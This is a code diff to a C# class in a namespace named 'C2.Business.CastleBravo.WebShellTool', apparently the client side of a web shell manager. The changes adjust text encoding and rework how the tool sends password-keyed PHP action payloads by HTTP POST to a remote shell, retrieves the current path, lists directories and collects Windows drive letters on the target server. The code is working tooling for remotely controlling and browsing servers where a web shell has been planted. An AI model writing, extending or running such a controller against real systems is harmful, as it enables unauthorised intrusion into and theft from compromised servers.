@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -27,21 +28,27 @@ namespace C2.Business.CastleBravo.WebShellTool
             PayloadLog = new List<string>();
 
             this.client = new WebClient();
-            client.Encoding = Encoding.UTF8;
+            client.Encoding = Encoding.Default;
         }
 
-        public Tuple<string, List<WSFile>> CurrentPathBrowse()
+        public Tuple<string, List<WSFile>, List<string>> CurrentPathBrowse()
         {
             return PathBrowse(PHPIndex());
         }
 
-        public Tuple<string, List<WSFile>> PathBrowse(string path)
+        public Tuple<string, List<WSFile>, List<string>> PathBrowse(List<string> pathList)
         {
             List<WSFile> pathFiles = new List<WSFile>();
+            List<string> broPaths = new List<string>();
 
-            if (string.IsNullOrEmpty(path))
-                return Tuple.Create(path, pathFiles);
+            if (pathList.Count == 0 || string.IsNullOrEmpty(pathList[0]))
+                return Tuple.Create(string.Empty, pathFiles, broPaths);
 
+            string path = pathList[0];
+
+            //broPath仅针对window文件系统，内容为c: d: e:
+            if (pathList.Count == 2 && pathList[1].Contains(":"))
+                broPaths = pathList[1].Split(':').ToList();
 
             string readDict = PHPReadDict(path);
             foreach (string item in readDict.Split('\n'))
@@ -56,13 +63,14 @@ namespace C2.Business.CastleBravo.WebShellTool
                                          itemInfo[2],
                                          itemInfo[3]));
             }
-            return Tuple.Create(path, pathFiles);
+            return Tuple.Create(path, pathFiles, broPaths);
         }
 
-        private string PHPIndex()
+        private List<string> PHPIndex()
         {
             PayloadLog.Add("========获取当前路径========");
-            return PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + versionSetting.ACTION + "=" + versionSetting.PHP_INDEX).Split('\t')[0];
+            string[] result = PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + versionSetting.ACTION + "=" + versionSetting.PHP_INDEX).Split('\t');
+            return result.Skip(0).Take(result.Length - 1).ToList();
         }
 
         private string PHPReadDict(string path)
@@ -81,7 +89,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             try
             {
                 byte[] responseData = client.UploadData(url, "POST", postData);//得到返回字符流  
-                result = Encoding.UTF8.GetString(responseData);//解码 
+                result = Encoding.Default.GetString(responseData);//解码 
 
                 foreach (string kv in payload.Split('&'))
                 {
